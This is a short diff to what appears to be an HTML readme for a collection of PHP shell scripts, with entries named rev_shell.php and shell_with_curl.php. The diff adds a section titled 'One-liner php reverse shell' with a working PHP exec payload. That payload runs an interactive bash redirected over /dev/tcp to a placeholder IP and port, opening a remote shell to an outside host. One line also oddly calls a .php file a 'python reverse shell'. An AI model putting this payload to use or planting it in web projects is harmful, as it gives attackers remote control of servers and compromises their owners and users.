@@ -1,3 +1,5 @@
+<h3 align='center'><b>One-liner php reverse shell</b></h3>
+ <pre><code>&lt;?php exec("/bin/bash -c 'bash -i >/dev/tcp/&lt;IP>/&lt;PORT> 0>&1'"); ?></code></pre>
 <h3 align='center'><b> rev_shell.php </b></h3>
  <p>A simple python reverse shell
 <h3 align='center'><b> shell_with_curl.php </b></h3> 
